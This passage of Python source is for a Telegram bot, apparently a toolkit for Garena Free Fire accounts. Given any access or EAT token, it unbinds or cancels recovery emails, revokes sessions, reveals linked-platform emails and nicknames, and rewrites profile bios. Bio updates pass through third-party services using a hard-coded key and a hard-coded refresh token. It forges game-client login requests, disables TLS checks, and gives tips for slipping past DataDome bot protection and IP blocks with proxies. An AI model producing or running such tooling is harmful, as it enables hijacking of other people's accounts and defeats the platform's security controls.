    token=context.user_data['unbind_token']; it=context.user_data['identity_token_unbind']; email=context.user_data['unbind_email']
    await update.message.reply_text("🚀 [3/3] Creating... 💎", reply_markup=get_main_keyboard())
    def unbind_req():
        url="https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
        d={"app_id":"100067","access_token":token,"identity_token":it}
        h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
        return make_request("POST",url,headers=h,data=d).text
    try:
        resp2=await asyncio.to_thread(unbind_req)
        try:
            j2=json.loads(resp2)
            if j2.get("result")==0:
                await update.message.reply_text(f"🎉 SUCCESS! 🎉💎\n📧 {email} Removed ✅\n💖 @just_zevric", reply_markup=get_main_keyboard())
            else:
                await update.message.reply_text(f"❌ Failed! 😔\n@just_zevric", reply_markup=get_main_keyboard())
        except:
            await update.message.reply_text(f"🎉 SUCCESS! 🎉💎\n📧 {email} Removed ✅\n💖 @just_zevric", reply_markup=get_main_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Error {e}", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def cancel_bind_start(update, context):
    await update.message.reply_text("⏱️ 𝗖𝗮𝗻𝗰𝗘𝗹 𝗥𝗲𝗾𝘂𝗘𝘀𝗧 ⏱️\n\n🔐 Token :", reply_markup=get_main_keyboard())
    return CANCEL_TOKEN

async def cancel_bind_token(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token=update.message.text.strip()
    context.user_data['cancel_token']=token
    def fetch():
        url="https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        r=make_request("GET",url,params={'app_id':"100067",'access_token':token},headers={'User-Agent':"GarenaMSDK/4.0.30"})
        return r.json()
    try:
        data=await asyncio.to_thread(fetch)
        pending=data.get("email_to_be","")
        if not pending:
            await update.message.reply_text("✅ No pending! ✅\n@just_zevric", reply_markup=get_main_keyboard())
            return ConversationHandler.END
        await update.message.reply_text(f"⚠️ Confirm Cancel?\n\n📧 Pending: {pending} ⏳\n\n✅ Yes / ❌ No", reply_markup=get_confirm_keyboard())
        return CANCEL_CONFIRM
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}\n\n⏱️ Try?", reply_markup=get_confirm_keyboard())
        return CANCEL_CONFIRM

async def cancel_bind_confirm(update, context):
    text=update.message.text.strip()
    if text in ALL_BUTTONS:
        return await switch_menu(update, context)
    if text in ["❌ No","No"]:
        await update.message.reply_text("❌ Aborted! ✅\n@just_zevric", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    if text not in ["✅ Yes","Yes"]:
        await update.message.reply_text("⚠️ Choose: Yes / No", reply_markup=get_confirm_keyboard())
        return CANCEL_CONFIRM
    token=context.user_data['cancel_token']
    await update.message.reply_text("⏱️ Canceling... ⚡", reply_markup=get_main_keyboard())
    def cancel():
        url="https://100067.connect.garena.com/game/account_security/bind:cancel_request"
        d={"app_id":"100067","access_token":token}
        h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
        return make_request("POST",url,headers=h,data=d).text
    try:
        resp=await asyncio.to_thread(cancel)
        try:
            j=json.loads(resp)
            if j.get("result")==0:
                await update.message.reply_text(f"✅ SUCCESS! ✅🎉\n📧 Cancelled ✅\n💖 @just_zevric", reply_markup=get_main_keyboard())
            else:
                await update.message.reply_text(f"❌ No pending! ✅\n@just_zevric", reply_markup=get_main_keyboard())
        except:
            await update.message.reply_text(f"✅ DONE! ✅\n💖 @just_zevric", reply_markup=get_main_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Error {e}", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def eat_to_token_start(update, context):
    await update.message.reply_text("🔑 𝗘𝗔𝗧 → 𝗧𝗼𝗸𝗘𝗡 🔑\n\n📎 EAT / URL :\n🌐 https://...?eat=xxx", reply_markup=get_main_keyboard())
    return EAT_INPUT

async def eat_to_token_convert(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    user_input=update.message.text.strip()
    await update.message.reply_text("🔑 Converting EAT... ⏳")
    def eat():
        eat_token=None
        try:
            if "http" in user_input or "?" in user_input or "eat=" in user_input:
                parsed=urllib.parse.urlparse(user_input)
                qs=urllib.parse.parse_qs(parsed.query)
                if 'eat' in qs:
                    eat_token=qs['eat'][0]
                else:
                    if "eat=" in user_input:
                        eat_token=user_input.split("eat=")[1].split("&")[0].split()[0]
            else:
                eat_token=user_input.strip()
            
            if not eat_token or len(eat_token) < 10:
                return None
            
            api_url=f"https://api-otrss.garena.com/support/callback/?access_token={eat_token}"
            headers={"User-Agent":"Mozilla/5.0 (Linux; Android 13; Mobile) AppleWebKit/537.36"}
            proxies = {"http": PROXY_URL, "https": PROXY_URL} if PROXY_URL else None
            r = requests.get(api_url, headers=headers, allow_redirects=True, timeout=15, verify=False, proxies=proxies)
            parsed_final=urllib.parse.urlparse(r.url)
            final_params=urllib.parse.parse_qs(parsed_final.query)
            if 'access_token' in final_params:
                return {
                    "access_token":final_params['access_token'][0],
                    "account_id":final_params.get('account_id',['Unknown'])[0],
                    "nickname":urllib.parse.unquote(final_params.get('nickname',['Unknown'])[0]),
                    "region":final_params.get('region',['Unknown'])[0]
                }
            return None
        except Exception as e:
            print(f"[EAT] Error: {e}")
            return None

    try:
        result=await asyncio.to_thread(eat)
        if result and result.get('access_token'):
            txt = f"🎉 𝗘𝗔𝗧 → 𝗧𝗢𝗞𝗘𝗡 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 🎉\n\n"
            txt += f"👤 𝗡𝗶𝗰𝗸: {result['nickname']}\n"
            txt += f"🆔 𝗜𝗗: {result['account_id']}\n"
            txt += f"🌍 𝗥𝗲𝗴𝗶𝗼𝗻: {result['region']}\n\n"
            txt += f"🔐 𝗧𝗼𝗸𝗲𝗻:\n{result['access_token']}\n\n"
            txt += f"👑 @just_zevric"
            await update.message.reply_text(txt, reply_markup=get_main_keyboard())
        else:
            await update.message.reply_text("❌ 𝗙𝗔𝗜𝗟𝗘𝗗! EAT expired/invalid 😔\n\n💡 Check EAT URL\n@just_zevric", reply_markup=get_main_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}\n@just_zevric", reply_markup=get_main_keyboard())
    return ConversationHandler.END


async def revoke_token_start(update, context):
    await update.message.reply_text("🚪 𝗥𝗲𝘃𝗢𝗸𝗘 𝗧𝗼𝗸𝗘𝗡 🚪\n\n🔐 Token :", reply_markup=get_main_keyboard())
    return REVOKE_TOKEN

async def revoke_token_verify(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token=update.message.text.strip()
    context.user_data['revoke_token']=token
    await update.message.reply_text("🔍 Checking...")
    def check():
        api_url=f"https://api-otrss.garena.com/support/callback/?access_token={token}"
        try:
            res=make_request("GET",api_url,headers={"User-Agent":"Mozilla/5.0"},allow_redirects=True)
            parsed=urllib.parse.urlparse(res.url); params=urllib.parse.parse_qs(parsed.query)
            if 'access_token' in params:
                return {"valid":True,"nickname":urllib.parse.unquote(params.get('nickname',['Unknown'])[0]),"account_id":params.get('account_id',['Unknown'])[0],"region":params.get('region',['Unknown'])[0]}
            else: return {"valid":False}
        except: return {"valid":False}
    try:
        check_res=await asyncio.to_thread(check)
        if not check_res['valid']:
            await update.message.reply_text("❌ Invalid/Expired! ⏰", reply_markup=get_main_keyboard())
            return ConversationHandler.END
        context.user_data['revoke_info']=check_res
        await update.message.reply_text(f"⚠️ Confirm Revoke?\n\n👤 Nick: {check_res['nickname']}\n🆔 ID: {check_res['account_id']}\n🌍 Region: {check_res['region']}\n\n❗ PERMANENT LOGOUT!\n\n✅ Yes / ❌ No", reply_markup=get_confirm_keyboard())
        return REVOKE_CONFIRM
    except Exception as e:
        await update.message.reply_text(f"❌ Error {e}", reply_markup=get_main_keyboard())
        return ConversationHandler.END

async def revoke_token_confirm(update, context):
    text=update.message.text.strip()
    if text in ALL_BUTTONS:
        return await switch_menu(update, context)
    if text in ["❌ No","No"]:
        await update.message.reply_text("❌ Cancelled! ✅\n@just_zevric", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    if text not in ["✅ Yes","Yes"]:
        await update.message.reply_text("⚠️ Choose: Yes / No", reply_markup=get_confirm_keyboard())
        return REVOKE_CONFIRM
    token=context.user_data['revoke_token']
    check_res=context.user_data['revoke_info']
    await update.message.reply_text(f"🚪 Revoking {check_res['nickname']}... ⚡", reply_markup=get_main_keyboard())
    def revoke():
        refresh_token="1380dcb63ab3a077dc05bdf0b25ba4497c403a5b4eae96d7203010eafa6c83a8"
        logout_url=f"https://100067.connect.garena.com/oauth/logout?access_token={token}&refresh_token={refresh_token}"
        r=make_request("GET",logout_url,headers={"User-Agent":"Mozilla/5.0"})
        return r.text, r.status_code
    try:
        resp_text,status=await asyncio.to_thread(revoke)
        if status==200 and "error" not in resp_text.lower():
            await update.message.reply_text(f"🎉 REVOKED! 🎉💎\n👤 Nick: {check_res['nickname']}\n🆔 ID: {check_res['account_id']}\n✅ Revoked 🔒\n💖 @just_zevric", reply_markup=get_main_keyboard())
        else:
            await update.message.reply_text(f"❌ Failed 😔\n@just_zevric", reply_markup=get_main_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Error {e}", reply_markup=get_main_keyboard())
    return ConversationHandler.END

COLOR_MAP = {
    "🔴 Red": "[FF0000]",
    "🟢 Green": "[00FF00]",
    "🔵 Blue": "[0000FF]",
    "🟡 Yellow": "[FFFF00]",
    "🟠 Orange": "[FF6B00]",
    "💜 Purple": "[800080]",
    "💖 Pink": "[FF00FF]",
    "💎 Cyan": "[00FFFF]",
    "✨ Gold": "[FFD700]",
    "⚪ Plain": "",
}

def get_color_keyboard():
    from telegram import ReplyKeyboardMarkup
    return ReplyKeyboardMarkup([
        ["🔴 Red", "🟢 Green", "🔵 Blue"],
        ["🟡 Yellow", "🟠 Orange", "💜 Purple"],
        ["💖 Pink", "💎 Cyan", "✨ Gold"],
        ["🌈 Rainbow", "🎨 Custom", "⚪ Plain"]
    ], resize_keyboard=True)

async def bio_start(update, context):
    await update.message.reply_text("📝 𝗟𝗢𝗡𝗚 𝗕𝗜𝗢 𝗨𝗣𝗗𝗔𝗧𝗘 🎮💎✨\n\n🔑 𝗧𝗼𝗞𝗘𝗡 (Access Token / EAT Token) 💎\n\n💡 Garena Limit: 300 chars max (including color codes)\n💡 Rainbow: 33 chars plain max (kyuki color codes se 300 ho jata hai)\n💡 EAT URL bhi daal sakte ho 🌐", reply_markup=get_main_keyboard())
    return BIO_TOKEN

async def bio_token(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    raw = update.message.text.strip()
    token = raw
    token_type = "access"
    if "http" in raw or "eat=" in raw or "?" in raw:
        parsed=urllib.parse.urlparse(raw)
        qs=urllib.parse.parse_qs(parsed.query)
        if 'eat' in qs:
            token=qs['eat'][0]
            token_type="eat"
        elif "eat=" in raw:
            token=raw.split("eat=")[1].split("&")[0].split()[0]
            token_type="eat"
    
    if token_type != "eat":
        if len(token) < 90 and not token.startswith("eyJ") and "." not in token:
            token_type = "eat"
    
    if len(token) < 10:
        await update.message.reply_text("❌ Token too short! 10+ chars 🔑", reply_markup=get_main_keyboard())
        return BIO_TOKEN
    
    context.user_data['bio_token'] = token
    context.user_data['bio_token_type'] = token_type
    await update.message.reply_text(f"✅ Token OK! Type: {token_type.upper()} 💎\n\n📝 Now send Bio Text 💬\n💡 Max 300 chars (Garena limit) - including color codes\n📝 Ex: ZEVRIC ON TOP 🔥", reply_markup=get_main_keyboard())
    return BIO_TEXT

async def bio_text(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    bio_raw = update.message.text.strip()
    # GARENA HARD LIMIT 300 chars - including color codes
    if len(bio_raw) < 1:
        await update.message.reply_text(f"❌ Bio empty!", reply_markup=get_main_keyboard())
        return BIO_TEXT
    if len(bio_raw) > 300:
        await update.message.reply_text(f"❌ Bio too long! {len(bio_raw)} chars\n💡 Garena limit: 300 chars max (including [FF0000] codes)\n💡 Aapka bio {len(bio_raw)} hai, 300 tak rakho\n💡 Rainbow ke liye 33 chars plain max rakho", reply_markup=get_main_keyboard())
        return BIO_TEXT
    if "[" in bio_raw and "]" in bio_raw:
        # Already has color codes, check final length
        if len(bio_raw) > 300:
            await update.message.reply_text(f"❌ Bio with color codes too long! {len(bio_raw)}/300\n💡 300 se kam rakho", reply_markup=get_main_keyboard())
            return BIO_TEXT
        context.user_data['bio_final'] = bio_raw
        await update.message.reply_text(f"👁️ Preview: {bio_raw[:150]} 🔥✨\n📏 Length: {len(bio_raw)}/300\n\n✅ Update? 🚀💎", reply_markup=get_confirm_keyboard())
        return BIO_CONFIRM
    context.user_data['bio_plain'] = bio_raw
    await update.message.reply_text(f"📝 Bio: {bio_raw} ✨\n📏 {len(bio_raw)}/300 chars (plain)\n\n🎨 Color 👇💎\n💡 Rainbow me har letter pe color lagta hai, isliye 33 chars se zyada plain mat rakho", reply_markup=get_color_keyboard())
    return BIO_COLOR

async def bio_color(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    choice = update.message.text.strip()
    plain = context.user_data.get('bio_plain','')
    if not plain:
        if 'bio_final' in context.user_data:
            bio_final = context.user_data['bio_final']
            if len(bio_final) > 300:
                await update.message.reply_text(f"❌ Bio too long {len(bio_final)}/300, chhota karo", reply_markup=get_main_keyboard())
                return BIO_TEXT
            await update.message.reply_text(f"👁️ Preview: {bio_final[:150]} 🔥\n📏 {len(bio_final)}/300\n\n✅ Update? 🚀💎", reply_markup=get_confirm_keyboard())
            return BIO_CONFIRM
        await update.message.reply_text("Bio missing! /start", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    
    # Rainbow handling - each char gets color code, so length multiplies by ~9
    if choice == "🌈 Rainbow":
        # Limit plain to 33 chars for rainbow to keep final <=300
        if len(plain) > 33:
            await update.message.reply_text(f"⚠️ Rainbow ke liye plain bio 33 chars se zyada nahi ho sakta!\n📏 Aapka: {len(plain)} chars\n💡 Kyuki har letter pe [FF0000] lagta hai, 33*9=297 chars ho jata hai\n💡 33 chars tak chhota karo ya Plain color use karo", reply_markup=get_main_keyboard())
            return BIO_TEXT
        colors = ["[FF0000]","[FFFF00]","[00FF00]","[00FFFF]","[0000FF]","[FF00FF]"]
        final = "".join(colors[i % len(colors)] + ch if ch.strip() else ch for i, ch in enumerate(plain))
        # Double check final length
        if len(final) > 300:
            final = final[:300]
        context.user_data['bio_final'] = final
        await update.message.reply_text(f"🌈 Rainbow: {final[:150]} 🔥\n📏 Final: {len(final)}/300 chars\n\n✅ Update? 🚀💎", reply_markup=get_confirm_keyboard())
        return BIO_CONFIRM
    
    if choice == "🎨 Custom":
        await update.message.reply_text(f"📝 Custom color code ke saath bio bhejo\nEx: [FF0000]ZEVRIC[00FF00]ON TOP\n💡 Total 300 chars max including codes\n\nCurrent plain: {plain} ({len(plain)} chars)", reply_markup=get_main_keyboard())
        return BIO_TEXT
    
    if choice in COLOR_MAP:
        code = COLOR_MAP[choice]
        final = code + plain if code else plain
        if len(final) > 300:
            await update.message.reply_text(f"❌ Final bio too long! {len(final)}/300\n💡 Plain: {len(plain)} + Color code: {len(code)} = {len(final)}\n💡 300 tak rakho", reply_markup=get_main_keyboard())
            return BIO_TEXT
        context.user_data['bio_final'] = final
        await update.message.reply_text(f"👁️ Preview: {final[:150]} {choice} ✨\n📏 {len(final)}/300\n\n✅ Update? 🚀💎", reply_markup=get_confirm_keyboard())
        return BIO_CONFIRM
    
    await update.message.reply_text("🎨 Choose color 👇", reply_markup=get_color_keyboard())
    return BIO_COLOR

async def bio_confirm(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    txt = update.message.text.strip()
    if txt not in ["✅ Yes","Yes"]:
        await update.message.reply_text("❌ Cancelled! /start", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    bio = context.user_data.get('bio_final','')
    token = context.user_data.get('bio_token','')
    token_type = context.user_data.get('bio_token_type','access')
    if not bio or not token:
        await update.message.reply_text("Data missing! /start", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    
    if len(bio) > 300:
        await update.message.reply_text(f"❌ Bio too long! {len(bio)}/300 chars\n💡 Garena limit 300 hai, chhota karo\n@just_zevric", reply_markup=get_main_keyboard())
        return BIO_TEXT
    
    msg = await update.message.reply_text(f"⏳ Updating Bio (Direct API)... 🚀💎\n📝 {bio[:80]} ✨\n🔑 Type: {token_type}\n📏 Length: {len(bio)}/300 chars", reply_markup=get_main_keyboard())
    
    def update_bio_direct():
        try:
            proxies = {"http": PROXY_URL, "https": PROXY_URL} if PROXY_URL else None
            
            # Step 1: Get access_token if EAT
            access_token = token
            if token_type == "eat":
                # EAT to access_token via Garena callback
                try:
                    eat_api = f"https://api-otrss.garena.com/support/callback/?access_token={token}"
                    r = requests.get(eat_api, headers={"User-Agent":"Mozilla/5.0"}, allow_redirects=True, timeout=15, verify=False, proxies=proxies)
                    parsed=urllib.parse.urlparse(r.url)
                    qs=urllib.parse.parse_qs(parsed.query)
                    if 'access_token' in qs:
                        access_token = qs['access_token'][0]
                        print(f"[BIO] EAT -> Access Token: {access_token[:20]}...")
                    else:
                        print(f"[BIO] EAT conversion failed, using raw token")
                except Exception as e:
                    print(f"[BIO] EAT conversion error: {e}")
            
            # Step 2: Access Token -> JWT via MajorLogin (like FF BAN)
            jwt_token = None
            region = "IND"
            try:
                # Try to get open_id and then JWT
                oId = None
                try:
                    r = requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}", headers={"User-Agent": "Mozilla/5.0"}, timeout=8, verify=False, proxies=proxies).json()
                    oId = r.get("open_id")
                except:
                    pass
                if not oId:
                    try:
                        uid_headers = {"access-token": access_token, "user-agent": "Mozilla/5.0"}
                        uid_res = requests.get("https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/", headers=uid_headers, verify=False, timeout=8, proxies=proxies).json()
                        uid = uid_res.get("uid")
                        if uid:
                            openid_res = requests.post("https://topup.pk/api/auth/player_id_login", headers={"Content-Type": "application/json"}, json={"app_id": 100067, "login_id": str(uid)}, verify=False, timeout=8, proxies=proxies).json()
                            oId = openid_res.get("open_id")
                    except:
                        pass
                if not oId and len(access_token) == 64:
                    oId = access_token
                
                if oId and MajorLogin:
                    platforms = [10, 3, 1, 8]
                    urls = ["https://loginbp.ggpolarbear.com/MajorLogin", "https://loginbp.common.garena.com/MajorLogin"]
                    for url in urls:
                        for p_type in platforms:
                            try:
                                pl = build_majorlogin(access_token, oId, p_type)
                                headers_jwt = {"User-Agent": "Dalvik/2.1.0", "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "Content-Type": "application/octet-stream", "X-GA": "v1 1", "X-Unity-Version": "2018.4.11f1", "ReleaseVersion": "OB54"}
                                x = requests.post(url, headers=headers_jwt, data=pl, timeout=10, verify=False, proxies=proxies)
                                if x.status_code == 200:
                                    res = MajorLoginRes()
                                    try:
                                        res.ParseFromString(dec(x.content))
                                    except:
                                        try:
                                            res.ParseFromString(x.content)
                                        except:
                                            continue
                                    if res.token:
                                        jwt_token = res.token
                                        # Extract region from JWT
                                        try:
                                            payload = decode_jwt(jwt_token)
                                            region = payload.get('lock_region') or payload.get('region') or "IND"
                                        except:
                                            pass
                                        print(f"[BIO] Got JWT: {jwt_token[:30]}... Region: {region}")
                                        break
                            except:
                                continue
                        if jwt_token:
                            break
            except Exception as e:
                print(f"[BIO] JWT conversion error: {e}")
            
            # Step 3: Try direct bio update via multiple APIs (FF BAN style multi-endpoint)
            # API 1: wzlongsign - uses JWT (most reliable for long bio)
            if jwt_token:
                try:
                    print(f"[BIO] Trying wzlongsign API with JWT")
                    wz_url = f"https://wzlongsign.vercel.app/updatebio?token={urllib.parse.quote(jwt_token, safe='')}&bio={urllib.parse.quote(bio, safe='')}&region={region}"
                    headers_wz = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
                    resp = requests.get(wz_url, headers=headers_wz, timeout=20, verify=False, proxies=proxies)
                    print(f"[BIO] wzlongsign Status: {resp.status_code} Resp: {resp.text[:500]}")
                    if resp.status_code == 200 and ("success" in resp.text.lower() or "updated" in resp.text.lower() or "bio" in resp.text.lower()):
                        return resp, "wzlongsign"
                except Exception as e:
                    print(f"[BIO] wzlongsign Error: {e}")
            
            # API 2: ff-long-bio-update-tools (fallback) - uses access_token
            try:
                BASE = "https://ff-long-bio-update-tools.vercel.app"
                KEY = "m41nul-x"
                headers = {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
                    "Accept": "application/json",
                    "Referer": f"{BASE}/",
                    "Origin": BASE,
                }
                if token_type == "eat":
                    url = f"{BASE}/api/eat-to-bio?eat_token={urllib.parse.quote(token, safe='')}&bio={urllib.parse.quote(bio, safe='')}&key={KEY}"
                else:
                    url = f"{BASE}/api/bio?access_token={urllib.parse.quote(access_token, safe='')}&bio={urllib.parse.quote(bio, safe='')}&key={KEY}"
                
                print(f"[BIO] Trying ff-long-bio-tools API")
                resp = requests.get(url, headers=headers, timeout=25, verify=False, proxies=proxies)
                print(f"[BIO] ff-long-bio-tools Status: {resp.status_code} Resp: {resp.text[:500]}")
                if resp.status_code == 200:
                    return resp, "ff-long-bio-tools"
                
                # Try POST fallback
                post_url = f"{BASE}/api/eat-to-bio" if token_type == "eat" else f"{BASE}/api/bio"
                payload = {"eat_token": token, "bio": bio, "key": KEY} if token_type == "eat" else {"access_token": access_token, "bio": bio, "key": KEY}
                resp_post = requests.post(post_url, json=payload, headers={**headers, "Content-Type": "application/json"}, timeout=25, verify=False, proxies=proxies)
                print(f"[BIO] POST Fallback Status: {resp_post.status_code}")
                if resp_post.status_code == 200:
                    return resp_post, "ff-long-bio-tools-post"
                
                return resp, "ff-long-bio-tools"
            except Exception as e:
                print(f"[BIO] ff-long-bio-tools Error: {e}")
            
            return None, "all_failed"
                
        except Exception as e:
            print(f"[BIO] Error: {e}")
            return None, str(e)
    
    try:
        result = await asyncio.to_thread(update_bio_direct)
        resp, api_used = result if isinstance(result, tuple) else (result, "unknown")
        try:
            await msg.delete()
        except:
            pass
        
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                if data.get("status") == "success" or data.get("success") or data.get("result") == 0 or "success" in resp.text.lower() or "updated" in resp.text.lower():
                    nickname = data.get("account_nickname") or data.get("bio_update", {}).get("nickname") or data.get("nickname") or "—"
                    uid = data.get("account_id") or data.get("bio_update", {}).get("uid") or data.get("uid") or "—"
                    await update.message.reply_text(f"🎉 𝗕𝗜𝗢 𝗨𝗣𝗗𝗔𝗧𝗘𝗗! 🎉💎\n\n👤 Nick: {nickname}\n🆔 UID: {uid}\n📝 Bio: {bio[:150]} 🔥\n📏 {len(bio)}/300 chars\n✅ API: {api_used}\n✅ Wait 1-2 min, relogin karo! 🚀💎\n\n👑 @just_zevric", reply_markup=get_main_keyboard())
                else:
                    await update.message.reply_text(f"⚠️ API ({api_used}) Response:\n{resp.text[:700]}\n\n💡 Token expire ya bio too long ho sakta hai. 300 se kam rakho\n@just_zevric", reply_markup=get_main_keyboard())
            except:
                if "success" in resp.text.lower() or "updated" in resp.text.lower():
                    await update.message.reply_text(f"🎉 𝗕𝗜𝗢 𝗨𝗣𝗗𝗔𝗧𝗘𝗗! 🎉💎\n📝 Bio: {bio[:150]} 🔥\n📏 {len(bio)}/300\n✅ API: {api_used}\n✅ Wait 2 min! 🚀💎\n👑 @just_zevric", reply_markup=get_main_keyboard())
                else:
                    await update.message.reply_text(f"⚠️ Response ({api_used}): {resp.text[:700]}\n@just_zevric", reply_markup=get_main_keyboard())
        else:
            status = resp.status_code if resp and hasattr(resp, 'status_code') else "No Response"
            text = resp.text[:700] if resp and hasattr(resp, 'text') else "No response - API down, token expired, ya Railway IP block"
            if "No Response" in str(status):
                await update.message.reply_text(f"❌ FAILED! Status: {status}\nResp: {text}\n\n💡 Fix:\n• Bio 300 chars se kam rakho (aapka {len(bio)}/300)\n• Fresh token/EAT use karo (token expire ho sakta hai)\n• API down ho sakta hai, 5 min baad try karo\n• PROXY_URL set karo agar Railway IP block hai\n• Rainbow ke liye plain bio 33 chars max rakho\n• Tried APIs: wzlongsign + ff-long-bio-tools\n@just_zevric", reply_markup=get_main_keyboard())
            else:
                await update.message.reply_text(f"❌ FAILED! Status: {status}\nResp: {text}\n\n💡 Bio {len(bio)}/300, fresh token try karo\n@just_zevric", reply_markup=get_main_keyboard())
    except Exception as e:
        try:
            await msg.delete()
        except:
            pass
        await update.message.reply_text(f"❌ Error! {str(e)[:300]}\n🔑 Fresh token! 🚀\n@just_zevric", reply_markup=get_main_keyboard())
    
    return ConversationHandler.END



async def resubscribe_start(update, context):
    await update.message.reply_text("📧 𝗥𝗘𝗦𝗨𝗕𝗕𝗜𝗖𝗥𝗜𝗕𝗘 𝗢𝗧𝗣 📧\n\n✉️ 𝗬𝗢𝗨𝗥 𝗘𝗠𝗔𝗜𝗟 💎", reply_markup=get_main_keyboard())
    return RESUB_EMAIL

async def resubscribe_email(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    email = update.message.text.strip()
    if "@" not in email or "." not in email or len(email) < 5:
        await update.message.reply_text("Invalid email! Ex: user@gmail.com", reply_markup=get_main_keyboard())
        return RESUB_EMAIL
    msg = await update.message.reply_text(f"📧 Sending OTP {email}... ⏳ (FF BAN style multi-try)")
    try:
        def send_otp():
            return send_register_code_email(email)
        status_code, response = await asyncio.to_thread(send_otp)
        try:
            await msg.delete()
        except:
            pass
        if status_code == 200:
            await update.message.reply_text(f"✅ 𝗢𝗧𝗣 𝗦𝗘𝗡𝗧! 📧\n📧 {email}\n📩 Check Inbox! (Spam bhi dekho)\n\n@just_zevric", reply_markup=get_main_keyboard())
        elif status_code == 403 and ("datadome" in response.lower() or "captcha" in response.lower()):
            await update.message.reply_text(f"🛡️ 𝗗𝗔𝗧𝗔𝗗𝗢𝗠𝗘 𝗕𝗟𝗢𝗖𝗞𝗘𝗗! 🛡️\n\n📧 {email}\n\nGarena ne bot protection laga diya hai.\n\n💡 Fix 1: Railway Variables → DATADOME_COOKIE update karo\n💡 Fix 2: PROXY_URL set karo (residential)\n\nLog: {response[:200]}\n@just_zevric", reply_markup=get_main_keyboard())
        else:
            await update.message.reply_text(f"❌ FAILED! Status: {status_code}\n📧 {email}\nResp: {response[:400]}\n@just_zevric", reply_markup=get_main_keyboard())
    except Exception as e:
        try:
            await msg.delete()
        except:
            pass
        await update.message.reply_text(f"❌ ERROR! {str(e)[:200]}\n@just_zevric", reply_markup=get_main_keyboard())
    return ConversationHandler.END



async def platform_start(update, context):
    await update.message.reply_text("🔍 Check Platform 🌐💎\n\n🔐 Token: 💎", reply_markup=get_main_keyboard())
    return PLATFORM_TOKEN

async def platform_token(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token = update.message.text.strip()
    if len(token) < 10:
        await update.message.reply_text("❌ Invalid token! 😔", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    msg = await update.message.reply_text("🔍 Fetching Platform... ⏳🌐")
    try:
        def fetch():
            url = "https://100067.connect.garena.com/bind/app/platform/info/get"
            headers = {
                'User-Agent': "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
                'Connection': "Keep-Alive",
                'Accept-Encoding': "gzip"
            }
            return make_request("GET", url, params={'access_token': token}, headers=headers)
        r = await asyncio.to_thread(fetch)
        if r.status_code not in [200,201]:
            await msg.edit_text(f"❌ Failed! {r.status_code} 😔\n{r.text[:200]}")
            return ConversationHandler.END
        j = r.json()
        m = {3: "Facebook 📘", 8: "Gmail 📧", 10: "iCloud 🍎", 5: "VK 🔵", 11: "Twitter 🐦", 7: "Huawei 🔴", 1: "Guest 👤"}
        bounded = j.get("bounded_accounts", [])
        available = j.get("available_platforms", [])
        
        txt = f"🔍 𝗣𝗟𝗔𝗧𝗙𝗢𝗥𝗠 𝗜𝗡𝗙𝗢 🌐💎\n\n"
        
        main_found = False
        for k in m:
            if k not in available:
                txt += f"👑 𝗠𝗔𝗜𝗡 𝗣𝗟𝗔𝗧𝗙𝗢𝗥𝗠: {m.get(k, f'ID {k}')} ✨\n\n"
                main_found = True
                break
        if not main_found:
            txt += f"ℹ️ 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲: {available}\n\n"
        
        txt += f"🔗 𝗦𝗘𝗖𝗢𝗡𝗗𝗔𝗥𝗬 𝗟𝗜𝗡𝗞𝗦:\n"
        found=False
        for x in bounded:
            try:
                p=x.get('platform')
                uinfo=x.get('user_info',{})
                e=uinfo.get('email','')
                n=uinfo.get('nickname','')
                uid=x.get('uid','')
                if p in m:
                    txt+=f"\n✅ {m.get(p)} ✨\n"
                    if e: txt+=f"   📧 Email: {e}\n"
                    if n: txt+=f"   👤 Name: {n}\n"
                    if uid: txt+=f"   🆔 UID: {uid}\n"
                    found=True
            except:
                continue
        if not found:
            txt+="❌ No Secondary Links 😔\n"
        
        txt+=f"\n👑 @just_zevric 💎\n💡 Main = jisse ID bana hai"
        await msg.edit_text(txt)
    except Exception as e:
        print(f"[PLATFORM] Error {e}")
        await msg.edit_text(f"❌ Error: {e} 😔\n@just_zevric")
    return ConversationHandler.END


async def switch_menu(update, context):
    text=update.message.text.strip()
    if text == "🔍 Bind Info Check":
        context.user_data.clear()
        return await check_info_start(update, context)
    elif text == "📧 Bind Email":
        context.user_data.clear()
        return await bind_email_start(update, context)
    elif text == "🔄 Change Bind Email":
        context.user_data.clear()
        return await change_email_start(update, context)
    elif text == "❌ Unbind Email":
        context.user_data.clear()
        return await unbind_email_start(update, context)
    elif text == "⏱️ Cancel Request":
        context.user_data.clear()
